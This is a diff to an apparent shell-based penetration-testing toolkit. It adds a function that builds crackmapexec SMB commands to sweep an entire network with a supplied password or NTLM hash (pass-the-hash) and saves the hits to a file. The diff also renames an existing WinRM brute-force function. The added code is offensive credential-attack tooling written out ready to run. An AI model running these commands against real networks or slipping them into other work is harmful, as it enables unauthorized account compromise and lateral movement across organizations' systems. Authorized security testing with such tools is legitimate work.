@@ -16,6 +16,7 @@ nb-ad-rce-brute-hydra                brute force password/login for a user accou
 nb-ad-rce-brute-cme                  brute force password/login for a user account with cme
 nb-ad-rce-pass-spray                 perform password spraying
 nb-ad-rce-brute-winrm                brute force password/login for a user account for winrm
+nb-ad-rce-cme-pass                   pass the password/hash
 
 Getting Shells
 --------------
@@ -206,7 +207,7 @@ nb-ad-rce-evil-winrm() {
   fi
 }
 
-nb-ad-rce-cme-winrm() {
+nb-ad-rce-brute-winrm() {
   __check-project
   nb-vars-set-rhost
   nb-vars-set-user
@@ -388,3 +389,38 @@ nb-ad-rce-brute-cme() {
       __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
     fi
 }
+
+nb-ad-rce-cme-pass() {
+    __check-project
+    nb-vars-set-network
+    nb-vars-set-user
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        __ask "Do you want to add a domain? (y/n)"
+        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+        if [[ $add_domain == "y" ]]; then
+            __ask "Enter the domain"
+            nb-vars-set-domain
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
+        else
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
+        fi
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netpath)/cme-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+}
+
